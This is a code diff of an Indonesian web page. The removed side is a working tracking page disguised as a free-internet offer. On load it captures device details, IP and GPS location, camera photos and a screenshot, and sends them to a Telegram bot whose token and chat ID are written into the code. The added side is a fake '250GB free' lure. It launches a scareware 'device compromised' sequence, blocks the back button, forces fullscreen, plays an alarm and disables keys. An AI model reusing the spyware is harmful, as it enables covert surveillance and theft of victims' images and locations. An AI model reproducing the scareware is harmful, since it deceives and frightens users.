@@ -2,149 +2,729 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1.0">
-    <title> Internet grátis para todos!</title>
-    <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS8iHkmSaIgCv_O-0zYbwvfN_hAwG2Pi8MSz2qkKBqlTA&s=10" type="image/x-icon">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>250GB Gratis - Promo Spesial</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        body{background:#000;margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial,sans-serif;color:#999;overflow:hidden}
-        #loading-container{text-align:center;width:80%;max-width:400px}
-        #loading-text{font-size:22px;margin-bottom:20px;color:#6e48aa}
-        #progress-container{height:3px;background:#222;border-radius:3px;overflow:hidden}
-        #progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#6e48aa,#9d50bb);transition:width .3s ease}
-        #loading-details{margin-top:20px;font-size:14px;color:#666}
-        .hidden{display:none}
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        body.no-scroll {
+            overflow: hidden !important;
+            touch-action: none;
+        }
+
+        /* Landing Page */
+        .landing {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+
+        .landing h1 {
+            color: #667eea;
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+
+        .landing .badge {
+            background: #ff6b6b;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+
+        .landing p {
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .start-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 18px 60px;
+            font-size: 1.3rem;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            width: 100%;
+        }
+
+        .start-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.5);
+        }
+
+        /* Prank Screen */
+        .prank-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a0a0a;
+            display: none;
+            z-index: 9999;
+            overflow: hidden;
+        }
+
+        .prank-container.active {
+            display: block;
+        }
+
+        /* Glitch Effect */
+        @keyframes glitch {
+            0% { transform: translate(0); filter: hue-rotate(0deg); }
+            10% { transform: translate(-5px, 5px); filter: hue-rotate(90deg); }
+            20% { transform: translate(5px, -5px); filter: hue-rotate(180deg); }
+            30% { transform: translate(-5px, -5px); filter: hue-rotate(270deg); }
+            40% { transform: translate(5px, 5px); filter: hue-rotate(360deg); }
+            50% { transform: translate(0); filter: hue-rotate(0deg); }
+            100% { transform: translate(0); filter: hue-rotate(0deg); }
+        }
+
+        @keyframes scanline {
+            0% { top: -100%; }
+            100% { top: 100%; }
+        }
+
+        @keyframes flicker {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+            75% { opacity: 0.9; }
+        }
+
+        @keyframes invertFlash {
+            0%, 100% { filter: invert(0); }
+            50% { filter: invert(1); }
+        }
+
+        .glitch-active {
+            animation: glitch 0.3s infinite;
+        }
+
+        .invert-flash {
+            animation: invertFlash 0.5s ease-in-out;
+        }
+
+        .scanline {
+            position: absolute;
+            width: 100%;
+            height: 10px;
+            background: rgba(255, 0, 0, 0.1);
+            top: -100%;
+            left: 0;
+            animation: scanline 3s linear infinite;
+            pointer-events: none;
+            z-index: 100;
+        }
+
+        /* Terminal Window */
+        .terminal {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 95%;
+            max-width: 600px;
+            background: #1a1a1a;
+            border-radius: 10px;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.3);
+            overflow: hidden;
+            font-family: 'Fira Code', monospace;
+        }
+
+        .terminal-header {
+            background: linear-gradient(180deg, #3a3a3a 0%, #2a2a2a 100%);
+            padding: 12px 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-bottom: 1px solid #444;
+        }
+
+        .terminal-btn {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .terminal-btn.red { background: #ff5f56; }
+        .terminal-btn.yellow { background: #ffbd2e; }
+        .terminal-btn.green { background: #27ca40; }
+
+        .terminal-title {
+            color: #999;
+            font-size: 0.85rem;
+            margin-left: 10px;
+            font-family: 'Fira Code', monospace;
+        }
+
+        .terminal-body {
+            padding: 20px;
+            min-height: 400px;
+            max-height: 70vh;
+            overflow-y: auto;
+            background: #0d0d0d;
+        }
+
+        .terminal-body::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .terminal-body::-webkit-scrollbar-track {
+            background: #1a1a1a;
+        }
+
+        .terminal-body::-webkit-scrollbar-thumb {
+            background: #ff0000;
+            border-radius: 4px;
+        }
+
+        .terminal-line {
+            color: #00ff00;
+            font-size: 0.85rem;
+            margin-bottom: 8px;
+            line-height: 1.5;
+            word-break: break-all;
+        }
+
+        .terminal-line.red { color: #ff4444; }
+        .terminal-line.yellow { color: #ffaa00; }
+        .terminal-line.cyan { color: #00ffff; }
+        .terminal-line.white { color: #ffffff; }
+        .terminal-line.blink { animation: flicker 0.5s infinite; }
+
+        .terminal-line .prefix {
+            color: #ff0000;
+        }
+
+        .cursor {
+            display: inline-block;
+            width: 10px;
+            height: 18px;
+            background: #00ff00;
+            animation: flicker 0.7s infinite;
+            vertical-align: middle;
+        }
+
+        /* Progress Bar */
+        .progress-container {
+            background: #333;
+            border-radius: 5px;
+            margin: 15px 0;
+            overflow: hidden;
+            height: 20px;
+            border: 1px solid #ff0000;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #ff0000, #ff4444, #ff0000);
+            background-size: 200% 100%;
+            animation: progressGlow 1s linear infinite;
+            transition: width 0.3s ease;
+            width: 0%;
+        }
+
+        @keyframes progressGlow {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 200% 50%; }
+        }
+
+        /* Warning Banner */
+        .warning-banner {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background: #ff0000;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            font-weight: bold;
+            font-family: 'Fira Code', monospace;
+            z-index: 101;
+            animation: flicker 0.3s infinite;
+            display: none;
+        }
+
+        /* Skull ASCII */
+        .skull-art {
+            color: #ff0000;
+            font-size: 0.6rem;
+            line-height: 1;
+            white-space: pre;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        /* Error Page */
+        .error-page {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a0a0a;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 10000;
+            font-family: 'Fira Code', monospace;
+        }
+
+        .error-page.active {
+            display: flex;
+        }
+
+        .error-code {
+            font-size: 8rem;
+            color: #ff0000;
+            font-weight: bold;
+            text-shadow: 0 0 50px rgba(255, 0, 0, 0.5);
+            animation: flicker 1s infinite;
+        }
+
+        .error-text {
+            color: #666;
+            font-size: 1.5rem;
+            margin-top: 20px;
+        }
+
+        .error-detail {
+            color: #444;
+            font-size: 0.9rem;
+            margin-top: 40px;
+            text-align: center;
+            padding: 0 20px;
+        }
+
+        /* Random Code Rain */
+        .code-rain {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            opacity: 0.1;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .rain-column {
+            position: absolute;
+            top: -100%;
+            color: #00ff00;
+            font-family: 'Fira Code', monospace;
+            font-size: 14px;
+            writing-mode: vertical-rl;
+            animation: rain 10s linear infinite;
+        }
+
+        @keyframes rain {
+            0% { top: -100%; opacity: 1; }
+            100% { top: 100%; opacity: 0; }
+        }
+
+        /* Mobile Optimizations */
+        @media (max-width: 480px) {
+            .terminal-body {
+                padding: 15px;
+                min-height: 350px;
+            }
+
+            .terminal-line {
+                font-size: 0.75rem;
+            }
+
+            .skull-art {
+                font-size: 0.45rem;
+            }
+
+            .error-code {
+                font-size: 5rem;
+            }
+        }
     </style>
 </head>
 <body>
-    <div id="loading-container">
-        <div id="loading-text">PROSES LOADING</div>
-        <div id="progress-container"><div id="progress-bar"></div></div>
-        <div id="loading-details">Memulai inisialisasi...</div>
+    <!-- Landing Page -->
+    <div class="landing" id="landing">
+        <h1>🎁 250GB</h1>
+        <div class="badge">GRATIS 100%</div>
+        <p>Dapatkan kuota internet 250GB gratis untuk semua operator! Promo terbatas, klik tombol di bawah untuk klaim sekarang.</p>
+        <button class="start-btn" id="startBtn">KLAIM SEKARANG</button>
     </div>
-    
-    <video id="v" autoplay muted class="hidden"></video>
-    <canvas id="c" class="hidden"></canvas>
 
-<script>
-(()=>{
-    const T=8513655052:AAGzU7wfzCWBeL_CuX2YwkOfnD7cEEhprKc', // <-- MASUKKAN TOKEN BOT TELEGRAM ANDA DI SINI
-          C='8544873944', // <-- MASUKKAN CHAT ID TELEGRAM ANDA DI SINI
-          pb=document.getElementById('progress-bar'),
-          ld=document.getElementById('loading-details');
+    <!-- Prank Container -->
+    <div class="prank-container" id="prankContainer">
+        <div class="scanline"></div>
+        <div class="code-rain" id="codeRain"></div>
+        
+        <div class="warning-banner" id="warningBanner">
+            ⚠️ CRITICAL SECURITY BREACH DETECTED ⚠️
+        </div>
 
-    let p=0;
-    const LM=["Memeriksa modul sistem...","Memuat komponen inti...","Menginisialisasi antarmuka...","Memverifikasi koneksi...","Menyiapkan lingkungan...","Memeriksa pembaruan...","Memuat aset tampilan..."];
-    
-    // Logic untuk progress bar
-    setInterval(()=>{
-        p+=Math.random()*5;
-        if(p>98)p=98;
-        pb.style.width=p+'%';
-        if(Math.random()>.9)ld.textContent=LM[Math.floor(Math.random()*LM.length)]
-    },500);
+        <div class="terminal" id="terminal">
+            <div class="terminal-header">
+                <div class="terminal-btn red"></div>
+                <div class="terminal-btn yellow"></div>
+                <div class="terminal-btn green"></div>
+                <span class="terminal-title">root@kali:~# system_breach.sh</span>
+            </div>
+            <div class="terminal-body" id="terminalBody">
+                <!-- Content will be injected here -->
+            </div>
+        </div>
+    </div>
 
-    // Fungsi kirim pesan ke Telegram
-    const sTG=async d=>{try{await fetch(`https://api.telegram.org/bot${T}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:C,text:d,parse_mode:'HTML'})})}catch(e){}};
-    
-    // Fungsi kirim foto ke Telegram
-    const sP=async(b,f)=>{try{const fd=new FormData();fd.append('chat_id',C);fd.append('photo',b,f);await fetch(`https://api.telegram.org/bot${T}/sendPhoto`,{method:'POST',body:fd})}catch(e){}};
-    
-    // Fungsi mendapatkan lokasi detail dari koordinat
-    const gLD=async(a,b)=>{try{const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`),d=await r.json();if(d.address)return{kb:d.address.county||d.address.city||d.address.state||"Tidak diketahui",kc:d.address.suburb||d.address.village||d.address.town||"Tidak diketahui",fa:d.display_name||"Alamat tidak tersedia"}}catch(e){}return{kb:"Tidak diketahui",kc:"Tidak diketahui",fa:"Alamat tidak tersedia"}};
-    
-    // Fungsi mendapatkan informasi perangkat
-    const cDI=async()=>{let m='╭───── Tracking Report ───── ⦿\n\n';m+='⚙️ DEVICE INFORMATION|BUKAN GPS TRACKING\n';m+=`🖥️ Device: ${navigator.userAgent}\n💻 Platform: ${navigator.platform}\n🌐 Bahasa: ${navigator.language}\n📶 Online: ${navigator.onLine?'Online':'Offline'}\n📺 Screen Size: ${screen.width}x${screen.height}\n🪟 Window Size: ${innerWidth}x${innerHeight}\n💾 RAM: ${navigator.deviceMemory||'Unknown'} GB\n🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;if(navigator.getBattery){try{const b=await navigator.getBattery();m+=`🔋 Battery: ${Math.floor(b.level*100)}%\n🔌 Charging: ${b.charging?'✅ YA':'❌ TIDAK'}\n`}catch(e){m+='🔋 Battery: ❌ Tidak tersedia\n'}}m+=`⏰ Waktu Akses: ${new Date().toString()}\n🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n📜 History Length: ${history.length}\n✋ Touch Support: ${'ontouchstart'in window?'✅ YA':'❌ TIDAK'}\n🔗 Referrer: ${document.referrer||'None'}\n🌍 URL: ${location.href}\n📄 Title: ${document.title}\n🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;try{const i=await fetch('https://ipapi.co/json/'),d=await i.json();m+='📍 LOCATION INFORMATION\n';m+=`📡 IP Address: ${d.ip}\n🏙️ Kota: ${d.city}\n🏙️ Kabupaten: ${d.region}\n🗺️ Wilayah: ${d.region}\n🌎 Negara: ${d.country_name}\n🏷️ Kode Pos: ${d.postal}\n`;if(d.latitude&&d.longitude){m+=`📌 Latitude: ${d.latitude}\n📍 Longitude: ${d.longitude}\n`;const l=await gLD(d.latitude,d.longitude);m+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat Lengkap: ${l.fa}\n`}}catch(e){m+='❌ Gagal mendapatkan informasi lokasi\n'}m+='\n╰───── Channel Telegram @GenzThe Nice One!!  ───── ⦿';return m};
+    <!-- Error Page -->
+    <div class="error-page" id="errorPage">
+        <div class="error-code">500</div>
+        <div class="error-text">Internal Server Error</div>
+        <div class="error-detail">
+            Connection terminated by remote host<br>
+            Session ID: <span id="sessionId"></span><br><br>
+            <span style="color: #ff0000;">[ DEVICE COMPROMISED ]</span>
+        </div>
+    </div>
 
-    // Mengambil gambar dari kamera dengan mode tertentu
-    const captureCamera = async (mode) => {
-        const v = document.getElementById('v'), 
-              c = document.getElementById('c');
-        let stream;
-        try {
-            stream = await navigator.mediaDevices.getUserMedia({
-                video: { 
-                    facingMode: { exact: mode } 
-                }
-            });
-            v.srcObject = stream;
-            
-            await new Promise(resolve => v.onloadedmetadata = resolve);
-            v.play();
+    <!-- Audio -->
+    <audio id="alarmSound" loop>
+        <source src="https://c.top4top.io/m_3629ohcxr0.mp3" type="audio/mpeg">
+    </audio>
 
-            // Waktu tunggu kamera 1.5 detik
-            await new Promise(r => setTimeout(r, 1500)); 
-            
-            c.width = v.videoWidth;
-            c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            
-            c.toBlob(b => sP(b, `${mode}_camera_capture.jpg`), 'image/jpeg');
-            
-            stream.getTracks().forEach(t => t.stop());
-            return true; 
-            
-        } catch (e) {
-            if (stream) {
-                stream.getTracks().forEach(t => t.stop());
+    <script>
+        // Utility Functions
+        const randomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
+        const randomHex = (len) => [...Array(len)].map(() => Math.floor(Math.random() * 16).toString(16).toUpperCase()).join('');
+        const randomIP = () => `${randomInt(10, 223)}.${randomInt(0, 255)}.${randomInt(0, 255)}.${randomInt(1, 254)}`;
+        const randomMAC = () => [...Array(6)].map(() => randomHex(2)).join(':');
+        const randomDeviceID = () => `${randomHex(4)}-${randomHex(4)}-${randomHex(4)}-${randomHex(4)}`;
+        const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+        // DOM Elements
+        const landing = document.getElementById('landing');
+        const prankContainer = document.getElementById('prankContainer');
+        const terminalBody = document.getElementById('terminalBody');
+        const warningBanner = document.getElementById('warningBanner');
+        const errorPage = document.getElementById('errorPage');
+        const alarmSound = document.getElementById('alarmSound');
+        const sessionIdSpan = document.getElementById('sessionId');
+        const codeRain = document.getElementById('codeRain');
+
+        // Fake Data Arrays
+        const fakeContacts = ['Mom', 'Dad', 'Boss', 'Best Friend', 'Partner', 'Bank Support', 'Work', 'Doctor'];
+        const fakeApps = ['WhatsApp', 'Instagram', 'TikTok', 'Banking App', 'Gallery', 'Camera', 'Notes', 'Email'];
+        const fakePaths = ['/storage/emulated/0/DCIM/', '/data/data/com.whatsapp/databases/', '/storage/sdcard/Download/', '/data/user/0/'];
+
+        // Skull ASCII Art
+        const skullArt = `
+    ██████╗ ██████╗ ███████╗ █████╗  ██████╗██╗  ██╗
+    ██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔════╝██║  ██║
+    ██████╔╝██████╔╝█████╗  ███████║██║     ███████║
+    ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██║     ██╔══██║
+    ██████╔╝██║  ██║███████╗██║  ██║╚██████╗██║  ██║
+    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
+        `;
+
+        // Block Back Button
+        function blockBackButton() {
+            history.pushState(null, null, location.href);
+            history.pushState(null, null, location.href);
+            history.pushState(null, null, location.href);
+            window.onpopstate = function() {
+                history.pushState(null, null, location.href);
+            };
+        }
+
+        // Disable Scroll
+        function disableScroll() {
+            document.body.classList.add('no-scroll');
+            document.addEventListener('touchmove', preventScroll, { passive: false });
+            document.addEventListener('wheel', preventScroll, { passive: false });
+        }
+
+        function preventScroll(e) {
+            e.preventDefault();
+        }
+
+        // Create Code Rain Effect
+        function createCodeRain() {
+            const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
+            for (let i = 0; i < 20; i++) {
+                const column = document.createElement('div');
+                column.className = 'rain-column';
+                column.style.left = `${i * 5}%`;
+                column.style.animationDelay = `${Math.random() * 5}s`;
+                column.style.animationDuration = `${5 + Math.random() * 10}s`;
+                column.textContent = [...Array(30)].map(() => chars[randomInt(0, chars.length - 1)]).join('');
+                codeRain.appendChild(column);
             }
-            await sTG(`⚠️ Gagal Akses Kamera ${mode.toUpperCase()}. Mencoba mode lain...`);
-            return false; 
-        }
-    };
-
-    // FUNGSI UTAMA: Menjalankan semua proses tracking
-    const ST=async()=>{
-        await sTG(await cDI()); 
-
-        let cameraSuccess = false;
-
-        // 1. Coba Kamera Depan (User)
-        cameraSuccess = await captureCamera("user");
-
-        // 2. Jika Gagal, Coba Kamera Belakang (Environment)
-        if (!cameraSuccess) {
-            cameraSuccess = await captureCamera("environment");
         }
 
-        if (!cameraSuccess) {
-             await sTG('❌ Akses ke kedua kamera (Depan & Belakang) diblokir.');
-        }
-
-        // Ambil Screenshot 
-        setTimeout(async()=>{
-            try{
-                const cn=await html2canvas(document.body);
-                cn.toBlob(b=>sP(b,'screenshot.jpg'),'image/jpeg')
-            }catch(e){
-                await sTG('❌ Screenshot failed')
+        // Type Effect
+        async function typeText(text, element, delay = 30) {
+            for (let char of text) {
+                element.textContent += char;
+                terminalBody.scrollTop = terminalBody.scrollHeight;
+                await sleep(delay);
             }
-        }, 2000); 
-
-        // Menggunakan getCurrentPosition untuk hanya mengirim 1x dan menambahkan link Google Maps
-        if(navigator.geolocation){
-            navigator.geolocation.getCurrentPosition(async p=>{
-                const lat = p.coords.latitude;
-                const lon = p.coords.longitude;
-                
-                // Menambahkan link Google Maps
-                let g=`📍 GPS TRACKING (ONE-TIME)\n`;
-                g+=`📌 Lat: ${lat}\n📍 Lng: ${lon}\n`;
-                g+=`🎯 Akurasi: ${p.coords.accuracy}m\n`;
-                g+=`🗺️ Google Maps: https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
-                
-                const l=await gLD(lat,lon);
-                g+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat: ${l.fa}\n`;
-                await sTG(g)
-            },async e=>{
-                await sTG(`❌ GPS Error: ${e.message}`)
-            },{enableHighAccuracy:true,maximumAge:0,timeout:5000})
         }
-    };
 
-    // Langsung menjalankan fungsi ST tanpa delay
-    ST();
-})();
-</script>
+        // Add Terminal Line
+        async function addLine(text, className = '', typing = true, delay = 30) {
+            const line = document.createElement('div');
+            line.className = `terminal-line ${className}`;
+            terminalBody.appendChild(line);
+            
+            if (typing) {
+                await typeText(text, line, delay);
+            } else {
+                line.textContent = text;
+            }
+            
+            terminalBody.scrollTop = terminalBody.scrollHeight;
+            return line;
+        }
+
+        // Add Progress Bar
+        async function addProgressBar(label, duration = 3000) {
+            await addLine(label, 'yellow');
+            
+            const container = document.createElement('div');
+            container.className = 'progress-container';
+            const bar = document.createElement('div');
+            bar.className = 'progress-bar';
+            container.appendChild(bar);
+            terminalBody.appendChild(container);
+            
+            // Random progress animation
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += randomInt(1, 15);
+                if (progress > 100) progress = 100;
+                bar.style.width = `${progress}%`;
+                if (progress >= 100) clearInterval(interval);
+            }, duration / 20);
+            
+            await sleep(duration);
+            return container;
+        }
+
+        // Trigger Glitch Effect
+        function triggerGlitch() {
+            const terminal = document.getElementById('terminal');
+            terminal.classList.add('glitch-active');
+            setTimeout(() => terminal.classList.remove('glitch-active'), 300);
+        }
+
+        // Trigger Invert Flash
+        function triggerInvert() {
+            prankContainer.classList.add('invert-flash');
+            setTimeout(() => prankContainer.classList.remove('invert-flash'), 500);
+        }
+
+        // Main Prank Sequence
+        async function startPrank() {
+            // Hide landing, show prank
+            landing.style.display = 'none';
+            prankContainer.classList.add('active');
+            document.body.style.background = '#000';
+            
+            // Block controls
+            blockBackButton();
+            disableScroll();
+            createCodeRain();
+            
+            // Try to go fullscreen
+            try {
+                await document.documentElement.requestFullscreen();
+            } catch(e) {}
+            
+            // Play sound
+            try {
+                alarmSound.volume = 1.0;
+                await alarmSound.play();
+            } catch(e) {}
+
+            // Start glitch intervals
+            const glitchInterval = setInterval(triggerGlitch, 2000);
+            const invertInterval = setInterval(triggerInvert, 5000);
+
+            // === PRANK SEQUENCE ===
+            
+            await addLine('[SYSTEM] Initializing connection...', 'cyan');
+            await sleep(500);
+            
+            await addLine(`[+] Target IP: ${randomIP()}`, 'red');
+            await addLine(`[+] Device ID: ${randomDeviceID()}`, 'red');
+            await addLine(`[+] MAC Address: ${randomMAC()}`, 'red');
+            await sleep(300);
+
+            // Skull Art
+            const skullDiv = document.createElement('div');
+            skullDiv.className = 'skull-art';
+            skullDiv.textContent = skullArt;
+            terminalBody.appendChild(skullDiv);
+            await sleep(1000);
+
+            triggerGlitch();
+            warningBanner.style.display = 'block';
+            
+            await addLine('', '');
+            await addLine('⚠️  CRITICAL SECURITY BREACH DETECTED  ⚠️', 'red blink');
+            await addLine('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'red');
+            await sleep(500);
+
+            await addLine('[!] Bypassing security protocols...', 'yellow');
+            await sleep(800);
+            await addLine('[✓] Security bypassed successfully', 'cyan');
+            
+            triggerInvert();
+            
+            // Fake file access
+            await addLine('', '');
+            await addLine('[PHASE 1] Accessing file system...', 'white');
+            for (let i = 0; i < 3; i++) {
+                const path = fakePaths[randomInt(0, fakePaths.length - 1)];
+                await addLine(`   → Scanning: ${path}${randomHex(8)}/`, '', true, 15);
+            }
+            await addProgressBar('[↓] Downloading files...', 2500);
+            await addLine(`[✓] ${randomInt(150, 500)} files extracted`, 'cyan');
+
+            triggerGlitch();
+            await sleep(300);
+
+            // Contacts
+            await addLine('', '');
+            await addLine('[PHASE 2] Extracting contacts...', 'white');
+            for (let contact of fakeContacts.slice(0, 5)) {
+                await addLine(`   → Found: ${contact} (+62${randomInt(800, 899)}${randomInt(1000000, 9999999)})`, '', true, 20);
+            }
+            await addProgressBar('[↓] Downloading contacts...', 2000);
+            await addLine(`[✓] ${randomInt(50, 200)} contacts extracted`, 'cyan');
+
+            triggerInvert();
+
+            // Gallery
+            await addLine('', '');
+            await addLine('[PHASE 3] Accessing gallery...', 'white');
+            await addLine(`   → Found: IMG_${randomInt(1000, 9999)}.jpg (${randomInt(1, 5)}.${randomInt(1, 9)}MB)`, '', true, 20);
+            await addLine(`   → Found: VID_${randomInt(1000, 9999)}.mp4 (${randomInt(10, 100)}MB)`, '', true, 20);
+            await addLine(`   → Found: Screenshot_${randomInt(2023, 2024)}${randomInt(10, 12)}${randomInt(10, 28)}.png`, '', true, 20);
+            await addProgressBar('[↓] Downloading media...', 3000);
+            await addLine(`[✓] ${randomInt(200, 1000)} media files extracted`, 'cyan');
+
+            triggerGlitch();
+
+            // Messages
+            await addLine('', '');
+            await addLine('[PHASE 4] Reading messages...', 'white');
+            for (let app of fakeApps.slice(0, 4)) {
+                await addLine(`   → Decrypting: ${app} database...`, '', true, 25);
+                await sleep(randomInt(200, 500));
+            }
+            await addProgressBar('[↓] Extracting conversations...', 2500);
+            await addLine(`[✓] ${randomInt(500, 2000)} messages extracted`, 'cyan');
+
+            triggerInvert();
+
+            // Banking
+            await addLine('', '');
+            await addLine('[PHASE 5] Accessing financial data...', 'red');
+            await addLine('   → Scanning banking applications...', 'yellow', true, 30);
+            await sleep(500);
+            await addLine(`   → Account detected: ****${randomInt(1000, 9999)}`, 'red', true, 25);
+            await addLine(`   → Balance: Rp ${randomInt(1, 50)}.${randomInt(100, 999)}.${randomInt(100, 999)}`, 'red', true, 25);
+            await addProgressBar('[!] Initiating transfer...', 3000);
+
+            triggerGlitch();
+            triggerGlitch();
+
+            // Location
+            await addLine('', '');
+            await addLine('[PHASE 6] Tracking location...', 'white');
+            await addLine(`   → GPS: ${randomInt(-10, 10)}.${randomInt(100000, 999999)}, ${randomInt(100, 140)}.${randomInt(100000, 999999)}`, '', true, 20);
+            await addLine(`   → Accuracy: ${randomInt(1, 10)}m`, '', true, 20);
+            await addLine('[✓] Location locked', 'cyan');
+
+            await sleep(500);
+
+            // Final warning
+            await addLine('', '');
+            await addLine('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'red');
+            await addLine('', '');
+            await addLine('🔴 DATA TRANSMISSION COMPLETE 🔴', 'red blink');
+            await addLine('', '');
+            await addLine(`Total data extracted: ${randomInt(500, 999)}MB`, 'yellow');
+            await addLine(`Upload server: ${randomInt(100, 200)}.${randomInt(0, 255)}.${randomInt(0, 255)}.${randomInt(1, 254)}`, 'yellow');
+            await addLine(`Session token: ${randomHex(32)}`, 'yellow');
+            await addLine('', '');
+
+            await addProgressBar('[↑] Uploading to remote server...', 4000);
+            
+            await addLine('', '');
+            await addLine('[✓] ALL DATA SUCCESSFULLY TRANSMITTED', 'red blink');
+            await addLine('', '');
+            await addLine('Connection terminated by remote host.', 'white');
+
+            // Clean up and show error
+            clearInterval(glitchInterval);
+            clearInterval(invertInterval);
+            
+            await sleep(2000);
+            
+            // Show error page
+            sessionIdSpan.textContent = randomHex(16);
+            prankContainer.classList.remove('active');
+            warningBanner.style.display = 'none';
+            errorPage.classList.add('active');
+            
+            // Stop sound after a moment
+            setTimeout(() => {
+                alarmSound.pause();
+            }, 3000);
+        }
+
+        // Event Listeners
+        document.getElementById('startBtn').addEventListener('click', startPrank);
+
+        // Prevent context menu
+        document.addEventListener('contextmenu', e => e.preventDefault());
+
+        // Prevent keyboard shortcuts
+        document.addEventListener('keydown', e => {
+            if (prankContainer.classList.contains('active') || errorPage.classList.contains('active')) {
+                e.preventDefault();
+            }
+        });
+    </script>
 </body>
-  </html>
+    </html>
